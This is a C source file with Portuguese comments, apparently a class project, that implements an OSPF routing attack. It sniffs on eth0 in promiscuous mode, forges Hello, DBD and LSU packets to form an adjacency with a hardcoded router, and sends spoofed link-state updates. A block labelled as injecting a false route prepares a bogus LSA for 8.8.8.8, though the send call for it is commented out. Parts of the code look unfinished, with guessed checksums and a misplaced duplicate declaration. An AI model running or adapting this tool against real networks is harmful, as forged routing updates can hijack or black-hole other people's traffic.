#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in_systm.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <pthread.h>
#include "structs.hpp"
#include "ipfuncs.hpp"

#define MAC_ADDR_LEN 6
#define IP4_HDRLEN 20
#define BUFFER_LEN 1518

struct ip ipHeader;
struct OSPF_HEADER ospf;
struct HELLO_HEADER hello;
struct DBD_HEADER dbdHeader;
struct LLS_HEADER llsHeader;
struct LSU_HEADER lsuHeader;
struct LSU_HEADER lsuHeaderInjection;
struct LSU_HEADER_2 lsuHeaderRouter;
struct LSA_HEADER_ACK lsuAck;
struct LSA_HEADER_ACK_CS lsuAckCs;
struct OSPF_HEADER_CS_LSU_ACK;
//struct LSA_HEADER lsaHeader;
struct OSPF_HEADER_CS ospCS;
struct OSPF_HEADER_CS_DBD ospCSDbd;
struct OSPF_HEADER_CS_LSU ospCSLsu;


typedef unsigned char MacAddress[MAC_ADDR_LEN];
unsigned char bufferMsg[BUFFER_LEN];
char buffer[BUFFER_LEN];

int socketRecebe;
struct ifreq ifr;

int socketEnvio = 0;
int retornoEnvio = 0;
struct sockaddr_ll destAddr;
short int etherTypeT;
int seqDbScript = 10000;
int status_adja = 0;

char* interfaceUtilizada = "eth0"; // hardcoded
char* ipLocal = "192.168.3.10";
char* ipBroadcast = "255.255.255.0";
char* ipMulticast = "224.0.0.5";
char* ipRoteador = "192.168.3.1";
u_int32_t seqAtual=0x00;

char* ipNetworkInjectionAddr = "8.8.8.0";
char* ipInjectionAddr = "8.8.8.8";



MacAddress macLocal = {0xa4, 0x1f, 0x72, 0xf5, 0x90, 0x80};
MacAddress macMulticast = {0x01, 0x00, 0x5e, 0x00, 0x00, 0x05};
MacAddress macRoteador = {0x50, 0x3d, 0xe5, 0xd9, 0x07, 0xb8};


/*
FIM DAS DEFINIÇÕES DAS VARIÁVEIS E CONSTANTES
*/

void* ReceberPacotes(void* g)
{
    if((socketRecebe = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
       printf("Erro na criacao do socket.\n");
       exit(1);
    }

    // Interface fixa
    strcpy(ifr.ifr_name, interfaceUtilizada);

    if(ioctl(socketRecebe, SIOCGIFINDEX, &ifr) < 0)
    	printf("Erro no ioctl!");

    ioctl(socketRecebe, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_PROMISC;
    ioctl(socketRecebe, SIOCSIFFLAGS, &ifr);

    // Recepção de pacotes
    int msgSucesso = 0;
    while (!msgSucesso)
	{
        recv(socketRecebe,(char *) &bufferMsg, sizeof(bufferMsg), 0x0);

        if(bufferMsg[26] == 192 && bufferMsg[27] == 168
            && bufferMsg[28] == 3 && bufferMsg[29] == 1)
        {
            if(bufferMsg[23] == 89)
            {
                if(bufferMsg[35] == 1)
                {
                    if(bufferMsg[30] == 192 && bufferMsg[31] == 168
                        && bufferMsg[32] == 3 && bufferMsg[33] == 10)
                    {
                        status_adja = 2;
                    }
                }
                else if(bufferMsg[35] == 2)
                {
                    if(bufferMsg[61] == 7)
                        status_adja = 1;
                    else if(bufferMsg[61] == 2)
                        status_adja = 3;
                    else if(bufferMsg[61] == 0)
                        status_adja = 4;
                }
                else if(bufferMsg[35] == 4)
                {
                    seqAtual = (bufferMsg[77] << 24) | (bufferMsg[76] << 16) | (bufferMsg[75] << 8) | bufferMsg[74];

                    EnviaMensagemLsuAck(macLocal, macRoteador);
                }
            }
        }
    }
}

void ConfiguracoesIniciais()
{
	etherTypeT = htons(0x0800);

	// Configuração inicial
	destAddr.sll_family = htons(PF_PACKET);
	destAddr.sll_protocol = htons(ETH_P_ALL);
	destAddr.sll_halen = 6;
	destAddr.sll_ifindex = 2;
	memcpy(&(destAddr.sll_addr), macMulticast, MAC_ADDR_LEN);

	// Configuração inicial IP
	ipHeader.ip_v = 4;
	ipHeader.ip_hl = IP4_HDRLEN / sizeof (uint32_t);
	ipHeader.ip_tos = ipHeader.ip_off = ipHeader.ip_sum = 0;
	ipHeader.ip_len = htons (sizeof(llsHeader) + sizeof(ipHeader) + sizeof(ospf) + sizeof(hello));
	ipHeader.ip_id = htons (0);
	ipHeader.ip_ttl = 1;
	ipHeader.ip_p = 89;
	inet_pton (AF_INET, ipLocal, &(ipHeader.ip_src));
	inet_pton (AF_INET, ipMulticast, &(ipHeader.ip_dst));
	ipHeader.ip_sum = CalculaChecksum ((uint16_t *) &ipHeader, IP4_HDRLEN);

	// Configuração inicial OSPF
	ospf.version = 2;
	ospf.type = 1;
	ospf.len = htons (sizeof(ospf) + sizeof(hello));
	inet_pton (AF_INET, ipLocal, &(ospf.routerid));
	ospf.areaid = ospf.chksum = ospf.authtype = 0;
	ospf.authdata[0] = ospf.authdata[1] = ospf.authdata[2] = ospf.authdata[3] = 0;
	ospf.authdata[4] = ospf.authdata[5] = ospf.authdata[6] = ospf.authdata[7] = 0;

	// Configuração inicial OSPF HELLO
	inet_pton (AF_INET, ipBroadcast, &(hello.mask));
	hello.helloint = htons(10);
	hello.options = 18;
	hello.priority = 1;
	hello.deadint = ntohl(40);
	inet_pton (AF_INET, "0.0.0.0", &(hello.dr));
	inet_pton (AF_INET, "0.0.0.0", &(hello.bdr));
	inet_pton (AF_INET, ipRoteador, &(hello.neighbor[0]));

	// Configuração inicial LLS
	llsHeader.checksum = htons(65526);
	llsHeader.len = htons(3);
	llsHeader.type = llsHeader.options = htons(1);
	llsHeader.optionsLen = htons(4);

	// Configuração inicial DBD
	dbdHeader.mtu = htons(1500);
	dbdHeader.options = 82;
	dbdHeader.dbdescript = 7;
	dbdHeader.ddsequence = ntohl(seqDbScript);

	// Configuração inicial LSU
	lsuHeader.count = ntohl(1);


    //LSU HEADER NETWORK
    lsuHeader.lsaNetw.age = htons(24);
    lsuHeader.lsaNetw.options = 34;
    lsuHeader.lsaNetw.type = 2;
    inet_pton (AF_INET, ipLocal, &(lsuHeader.lsaNetw.stateid));
    inet_pton (AF_INET, ipLocal, &(lsuHeader.lsaNetw.router));
    lsuHeader.lsaNetw.seq = htonl(0); // incrementar
    lsuHeader.lsaNetw.chksum = htons(0); // vai saber
    lsuHeader.lsaNetw.length = htons(32); // saberá na hora
    inet_pton (AF_INET, ipBroadcast, &(lsuHeader.lsaNetw.netmask));
    inet_pton (AF_INET, ipLocal, &(lsuHeader.lsaNetw.r1));
    inet_pton (AF_INET, ipRoteador, &(lsuHeader.lsaNetw.r2));


    //LSU HEADER ROUTER
	lsuHeaderRouter.count = ntohl(1);


    lsuHeaderRouter.lsaRouter.age = htons(24);
    lsuHeaderRouter.lsaRouter.options = 34;
    lsuHeaderRouter.lsaRouter.type = 1;
    inet_pton (AF_INET, ipLocal, &(lsuHeaderRouter.lsaRouter.stateid));
    inet_pton (AF_INET, ipLocal, &(lsuHeaderRouter.lsaRouter.router));
    lsuHeaderRouter.lsaRouter.seq = htonl(0); // incrementar
    lsuHeaderRouter.lsaRouter.chksum = htons(0); // vai saber
    lsuHeaderRouter.lsaRouter.length = htons(36); // saberá na hora
    lsuHeaderRouter.lsaRouter.flags = 0x02;
    lsuHeaderRouter.lsaRouter.dummy = 0x00;
    lsuHeaderRouter.lsaRouter.num_links = htons(0x01);
	inet_pton (AF_INET, ipRoteador, &(lsuHeaderRouter.lsaRouter.transit1.ip_designated_router));
    inet_pton (AF_INET, ipLocal, &(lsuHeaderRouter.lsaRouter.transit1.link_data));
    lsuHeaderRouter.lsaRouter.transit1.link_type = 2;
    lsuHeaderRouter.lsaRouter.transit1.num_TOS = 0;
    lsuHeaderRouter.lsaRouter.transit1.TOS = htons(0);

	uint32_t num_links;
	u_int16_t age;
    u_int8_t options;
    u_int8_t type_lsa;
    struct in_addr link_state;
    struct in_addr adv_router;
    u_int32_t seq;
    u_int16_t chksum_ack;
    u_int16_t len_ack;

    //LSU HEADER ACK
    //lsuAck.num_links =
    lsuAck.age = htons(24);
    lsuAck.options = 34;
    lsuAck.type_lsa = 0x01;
    inet_pton (AF_INET, ipLocal, &(lsuAck.link_state_id));
    inet_pton (AF_INET, ipLocal, &(lsuAck.adv_router));
    lsuAck.seq = htonl(0); // incrementar
    lsuAck.chksum = htons(0); // vai saber
    lsuAck.len = htons(20); // saberá na hora
    lsuAck.type_lsa = 0x01;

    //LSU NETWORK INJETANDO ROTA FALSA
    lsuHeaderInjection.lsaNetw.age = htons(24);
    lsuHeaderInjection.lsaNetw.options = 34;
    lsuHeaderInjection.lsaNetw.type = 2;
    inet_pton (AF_INET, ipInjectionAddr, &(lsuHeaderInjection.lsaNetw.stateid));
    inet_pton (AF_INET, ipLocal, &(lsuHeaderInjection.lsaNetw.router));
    lsuHeaderInjection.lsaNetw.seq = htonl(0); // incrementar
    lsuHeaderInjection.lsaNetw.chksum = htons(0); // vai saber
    lsuHeaderInjection.lsaNetw.length = htons(32); // saberá na hora
    inet_pton (AF_INET, ipBroadcast, &(lsuHeaderInjection.lsaNetw.netmask));
    inet_pton (AF_INET, ipInjectionAddr, &(lsuHeaderInjection.lsaNetw.r1));


char* ipNetworkInjectionAddr = "8.8.8.0";
char* ipInjectionAddr = "8.8.8.8";



	// Configurações para cálculo do checksum do ospf
	ospCS.version = ospf.version;
	ospCS.type = ospf.type;
	ospCS.len = ospf.len;
	ospCS.routerid = ospf.routerid;
	ospCS.areaid = ospf.areaid;
	ospCS.authtype = ospf.authtype;
	ospCS.mask = hello.mask;
	ospCS.helloint = hello.helloint;
	ospCS.options = hello.options;
	ospCS.priority = hello.priority;
	ospCS.deadint = hello.deadint;
	ospCS.dr = hello.dr;
	ospCS.bdr = hello.bdr;
	ospCS.neighbor[0] = hello.neighbor[0];

	ospCSDbd.version = ospf.version;
	ospCSDbd.type = ospf.type;
	ospCSDbd.len = ospf.len;
	ospCSDbd.routerid = ospf.routerid;
	ospCSDbd.areaid = ospf.areaid;
	ospCSDbd.authdata[0] = ospCSDbd.authdata[1] = ospCSDbd.authdata[2] = 0;
	ospCSDbd.authdata[3] = ospCSDbd.authdata[4] = ospCSDbd.authdata[5] = 0;
	ospCSDbd.authdata[6] = ospCSDbd.authdata[7] = 0;

	ospCSDbd.mtu = dbdHeader.mtu;
	ospCSDbd.options = dbdHeader.options;
	ospCSDbd.dbdescript = dbdHeader.dbdescript;
	ospCSDbd.ddsequence = dbdHeader.ddsequence;

    // LSU Check
	ospCSLsu.type = ospf.type;
	ospCSLsu.len = ospf.len;
	ospCSLsu.routerid = ospf.routerid;
	ospCSLsu.areaid = ospf.areaid;
	ospCSLsu.chksum = ospf.chksum;
	ospCSLsu.authdata[0] = ospCSLsu.authdata[1] = ospCSLsu.authdata[2] = ospCSLsu.authdata[3] = 0;
	ospCSLsu.authdata[4] = ospCSLsu.authdata[5] = ospCSLsu.authdata[6] = ospCSLsu.authdata[7] = 0;

	ospCSLsu.count = lsuHeader.count;

    ospCSLsu.lsaNetw.age = lsuHeader.lsaNetw.age;
    ospCSLsu.lsaNetw.options = lsuHeader.lsaNetw.options;
    ospCSLsu.lsaNetw.type = lsuHeader.lsaNetw.type;
    ospCSLsu.lsaNetw.stateid = lsuHeader.lsaNetw.stateid;
    ospCSLsu.lsaNetw.router = lsuHeader.lsaNetw.router;
    ospCSLsu.lsaNetw.seq = lsuHeader.lsaNetw.seq; // incrementar
    ospCSLsu.lsaNetw.chksum = lsuHeader.lsaNetw.chksum; // vai saber
    ospCSLsu.lsaNetw.length = lsuHeader.lsaNetw.length; // saberá na hora
    ospCSLsu.lsaNetw.netmask = lsuHeader.lsaNetw.netmask;
    ospCSLsu.lsaNetw.r1 = lsuHeader.lsaNetw.r1;
    ospCSLsu.lsaNetw.r2 = lsuHeader.lsaNetw.r1;

	lsuAckCs.type = ospf.type;
	lsuAckCs.len = ospf.len;
	lsuAckCs.routerid = ospf.routerid;
	lsuAckCs.areaid = ospf.areaid;
	lsuAckCs.chksum = ospf.chksum;
	lsuAckCs.authdata[0] = lsuAckCs.authdata[1] = lsuAckCs.authdata[2] = lsuAckCs.authdata[3] = 0;
	lsuAckCs.authdata[4] = lsuAckCs.authdata[5] = lsuAckCs.authdata[6] = lsuAckCs.authdata[7] = 0;

    lsuAckCs.age = lsuAck.age;
    lsuAckCs.options = lsuAck.options;
    lsuAckCs.type_lsa = lsuAck.type_lsa;
    lsuAckCs.link_state_id = lsuAck.link_state_id;
    lsuAckCs.adv_router = lsuAck.adv_router;
    lsuAckCs.seq = lsuAck.seq; // incrementar
    lsuAckCs.chksumLSA = lsuAck.chksum; // vai saber
    lsuAckCs.lenLSA = lsuAck.len; // saberá na hora
    lsuAckCs.type_lsa = lsuAck.type_lsa;


	ospf.chksum = CalculaChecksum ((uint16_t *) &ospCS, sizeof(ospCS));
}


void* EnviaHello(void* c){
    do{
        sleep(10);
        EnviaMensagemHello(macLocal, macMulticast, 0);
    }while(1);
}
/*

Função Main

*/
int main()
{
	if((socketEnvio = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		printf("Erro na criacao do socket.\n");
		exit(1);
	}

	ConfiguracoesIniciais();

	pthread_t recv_thread;
	pthread_create(&recv_thread, NULL, ReceberPacotes, NULL);

	while(1)
	{
        if(status_adja == 0)
        {
            EnviaMensagemHello(macLocal, macMulticast, 1);
        }
        else if(status_adja == 1)
        {
            EnviaMensagemDbd(macLocal, macRoteador, 7);
        }
        else if(status_adja == 2)
        {
            EnviaMensagemDbd(macLocal, macRoteador, 3);
        }
        else if(status_adja == 3)
        {
            EnviaMensagemDbd(macLocal, macRoteador, 1);
        }
        else if(status_adja == 4)
        {
        	//EnviaMensagemLsuAck(macLocal, macRoteador);
            EnviaMensagemLsuNetwork(macLocal, macRoteador);
            sleep(2);
            EnviaMensagemLsuRouter(macLocal, macRoteador);
            sleep(2);
            EnviaMensagemLsuAck(macLocal, macRoteador);
            //sleep(5);
            //EnviaMensagemLsuInjection(macLocal, macRoteador);
            //Depois tem que fazer o injection
            break;

        }
        else if(status_adja == 5)
        {
            break;
        }

        sleep(1);
	}

    pthread_t send_hello;
    pthread_create(&send_hello, NULL, EnviaHello, NULL);

	pthread_join(send_hello, NULL);
	pthread_join(recv_thread, NULL);
}
